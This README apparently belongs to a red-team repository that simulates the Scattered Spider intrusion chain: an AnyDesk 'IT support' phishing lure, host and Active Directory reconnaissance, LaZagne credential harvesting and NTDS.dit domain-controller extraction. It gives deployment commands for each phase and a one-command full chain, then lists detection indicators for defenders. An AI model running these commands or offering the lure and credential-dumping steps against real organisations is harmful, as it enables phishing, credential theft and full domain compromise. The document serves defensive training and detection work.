# Scattered Spider Attack Chain - Complete Workflow

## Overview
This repository simulates the complete Scattered Spider attack chain for security research and defensive training purposes, including credential extraction and domain controller compromise.

## Attack Vector Flow

### Phase 1: Initial Access (Email + AnyDesk)
```
User receives IT support email
    ↓
Downloads IT_AnyDesk_Support.zip
    ↓
Executes Deploy_AnyDesk_IT.bat (requires admin)
    ↓
AnyDesk installed with admin privileges
    ↓
Git CLI automatically installed (system-wide or user-level)
    ↓
User provides AnyDesk ID to "IT support"
    ↓
Attacker gains remote admin access
```

### Phase 2: Repository Staging
```
Attacker connects via AnyDesk
    ↓
Opens PowerShell on victim host
    ↓
git clone https://github.com/Jonathan-D-a-v-i-d/Scattered_Spider.git
    ↓
cd Scattered_Spider
```

### Phase 3: Host Reconnaissance
```
.\Deploy_VictimHostRecon.ps1
    ↓
Victim Host Recon Module loaded
    ↓
Run-Recon (executes all local host techniques)
    ↓
Results saved to C:\Intel\Logs\
```

### Phase 4: Domain Reconnaissance
```
.\Deploy_ADRecon.ps1
    ↓
RSAT installation (if needed)
    ↓
AD Reconnaissance Module loaded
    ↓
Run-ADRecon (executes all domain techniques)
    ↓
Results saved to C:\Intel\Logs\
```

### Phase 5: Post-Exploitation - Credential Extraction
```
.\Deploy_CredExtraction.ps1 -TargetUser Sherlock
    ↓
LaZagne downloaded and executed
    ↓
Browser credentials, Windows creds, cached domain creds extracted
    ↓
Sherlock's domain admin credentials harvested
    ↓
Credentials saved to C:\Intel\Logs\
```

### Phase 6: Post-Exploitation - Domain Controller Compromise
```
.\Deploy_DCCompromise.ps1 -Username Sherlock -Password [extracted]
    ↓
Domain Controller discovery
    ↓
Credential validation (domain admin check)
    ↓
NTDS.dit extraction via ntdsutil/VSS
    ↓
Complete domain hash database obtained
    ↓
Full domain compromise achieved
```

## Files and Components

### Initial Access Tools
- `IT_AnyDesk_Support/IT_AnyDesk_Deployment.ps1` - Main AnyDesk installer with embedded config
- `IT_AnyDesk_Support/Deploy_AnyDesk_IT.bat` - User-friendly wrapper  
- `IT_AnyDesk_Support.zip` - Complete deployment package for email
- All tools consolidated in single deployment structure

### Git Installation Tools (Integrated)
- Git installation tools now embedded in IT_AnyDesk_Support deployment package
- Smart Git installer with privilege auto-detection
- No separate folder needed - all tools consolidated for deployment

### Reconnaissance Framework (Organized)
- `Recon/Host/VictimHostRecon.psm1` - Local host reconnaissance module
- `Recon/AD/ADRecon.psm1` - Active Directory reconnaissance module
- `Recon/AD/Install_RSAT.ps1` - RSAT tools installation
- `Deploy_VictimHostRecon.ps1` - Host recon deployment script
- `Deploy_ADRecon.ps1` - AD recon deployment script

### Post-Exploitation Framework
- `Post-Exploit/CredExtraction/CredExtraction.psm1` - LaZagne credential extraction module
- `Post-Exploit/CredExtraction/Credential Extraction (T1555-T1003).ps1` - Main extraction script
- `Post-Exploit/DCCompromise/DCCompromise.psm1` - DC compromise and NTDS extraction module
- `Post-Exploit/DCCompromise/NTDS Extraction (T1003.003).ps1` - NTDS.dit extraction script
- `Deploy_CredExtraction.ps1` - Credential extraction deployment
- `Deploy_DCCompromise.ps1` - DC compromise deployment

### Full Chain Automation
- `Deploy_Complete_Chain.ps1` - Complete 6-phase attack chain automation

### MITRE ATT&CK Techniques Covered

#### Host Reconnaissance (VictimHostRecon)
- **T1082** - System Information Discovery
- **T1087** - Account Discovery (Local)
- **T1057** - Process Discovery
- **T1518** - Software Discovery
- **T1046** - Network Service Discovery
- **T1083** - File and Directory Discovery

#### Domain Reconnaissance (ADRecon)
- **T1087.002** - Account Discovery (Domain)
- **T1615** - Group Policy Discovery
- **T1018** - Remote System Discovery
- **T1482** - Domain Trust Discovery

#### Credential Extraction (CredExtraction)
- **T1555** - Credentials from Password Stores
- **T1003** - OS Credential Dumping

#### Domain Controller Compromise (DCCompromise)
- **T1003.003** - OS Credential Dumping: NTDS

## Quick Deployment Commands

### For IT Support (Social Engineering)
```powershell
# Email the zip file, user runs:
Deploy_AnyDesk_IT.bat
```

### For Security Research (Complete Chain)
```powershell
# Simulate complete 6-phase attack chain:
.\Deploy_Complete_Chain.ps1 -FullAttackChain -TargetUser Sherlock -DomainAdminUsername [user] -DomainAdminPassword [pass]

# Or individual phases:
.\Deploy_VictimHostRecon.ps1    # Phase 3: Host reconnaissance
.\Deploy_ADRecon.ps1            # Phase 4: Domain reconnaissance  
.\Deploy_CredExtraction.ps1     # Phase 5: Credential extraction
.\Deploy_DCCompromise.ps1       # Phase 6: DC compromise
```

### For Lab Scenario (Irene → Sherlock → DC)
```powershell
# Irene (local admin) runs AnyDesk ZIP, Sherlock (domain admin) logged in
.\Deploy_CredExtraction.ps1 -TargetUser Sherlock
# Extract Sherlock's domain admin credentials

# Use extracted credentials for DC compromise
.\Deploy_DCCompromise.ps1 -Username Sherlock -Password [extracted_password]
# Extract NTDS.dit for complete domain takeover
```

### For Manual Operations
```powershell
# Host reconnaissance:
Import-Module .\Recon\Host\VictimHostRecon.psm1 -Force
Run-Recon

# Domain reconnaissance:
Import-Module .\Recon\AD\ADRecon.psm1 -Force
Run-ADRecon

# Credential extraction:
Import-Module .\Post-Exploit\CredExtraction\CredExtraction.psm1 -Force
Run-CredExtraction

# DC compromise:
Import-Module .\Post-Exploit\DCCompromise\DCCompromise.psm1 -Force
Run-DCCompromise

# Individual techniques:
Get-HostInfo                    # System info
Invoke-AccountDiscovery         # Local accounts
Invoke-DomainUserDiscovery      # Domain users
Invoke-ComputerDiscovery        # Domain computers
Invoke-CredentialExtraction     # LaZagne extraction
Invoke-NTDSExtraction           # NTDS.dit extraction
```

## Output and Results

All attack results are centralized in:
```
C:\Intel\Logs\
# Host Reconnaissance
├── VictimHost_SystemInfoDiscovery.txt
├── VictimHost_AccountDiscovery.txt
├── VictimHost_ProcessDiscovery.txt
├── VictimHost_SoftwareDiscovery.txt
├── VictimHost_NetworkServiceDiscovery.txt
├── VictimHost_FileDirectoryDiscovery.txt
├── VictimHost_ReconSummary.txt
# Domain Reconnaissance  
├── ADRecon_DomainUserDiscovery.txt
├── ADRecon_GroupPolicyDiscovery.txt
├── ADRecon_ComputerDiscovery.txt
├── ADRecon_TrustDiscovery.txt
├── ADRecon_ReconSummary.txt
# Post-Exploitation - Credential Extraction
├── CredExtraction_CredentialExtraction.txt
├── CredExtraction_BrowserCredentials.txt
├── CredExtraction_MemoryCredentials.txt
├── CredExtraction_ExtractionSummary.txt
└── CredExtraction_LaZagne_Raw.txt
# Post-Exploitation - DC Compromise
├── DCCompromise_DCDiscovery.txt
├── DCCompromise_NTDSExtraction.txt
├── DCCompromise_CompromiseSummary.txt
└── NTDS_Extraction/
    ├── ntds.dit (domain database)
    └── SYSTEM (registry hive)
```

## Security Features

### Automated Git Installation
- **Smart Detection**: Auto-detects admin privileges
- **Fallback Strategy**: System-wide → User-level → Portable
- **Integrated Workflow**: AnyDesk deployment automatically ensures Git availability

### Professional Social Engineering
- **Legitimate Appearance**: Uses official AnyDesk installer
- **IT Branding**: Professional email templates and deployment packages
- **Error Handling**: Comprehensive logging and fallback mechanisms

### Complete Attack Chain
- **MITRE Mapped**: All techniques properly categorized (13 total techniques)
- **Modular Design**: Can execute individual techniques, module-level, or complete attack chain
- **Centralized Output**: Single location for all collected intelligence
- **Multi-Phase**: Reconnaissance (Host + AD) + Post-Exploitation (CredExtraction + DC Compromise)
- **LaZagne Integration**: Automatic credential harvesting from multiple sources
- **NTDS Extraction**: Complete domain database compromise for hash extraction
- **Logical Organization**: Clear separation between reconnaissance and post-exploitation activities

## Defensive Considerations

This framework helps security teams understand:
- **Social Engineering Vectors**: How IT support requests can be weaponized
- **Post-Access Techniques**: What attackers do after gaining remote access
- **Detection Opportunities**: File locations and command patterns to monitor

Monitor for:
- Unexpected AnyDesk installations
- Git operations from non-developer accounts  
- File creation in `C:\Intel\Logs\`
- PowerShell execution of reconnaissance scripts
- RSAT installation attempts on workstations
- Active Directory enumeration commands (Get-ADUser, Get-ADComputer, etc.)
- Mass queries to domain controllers
- LaZagne.exe download and execution
- Browser credential database access (Login Data, logins.json)
- Volume Shadow Copy creation for NTDS access
- ntdsutil.exe execution on domain controllers
- Large file transfers from system directories
- NTDS.dit and SYSTEM hive file access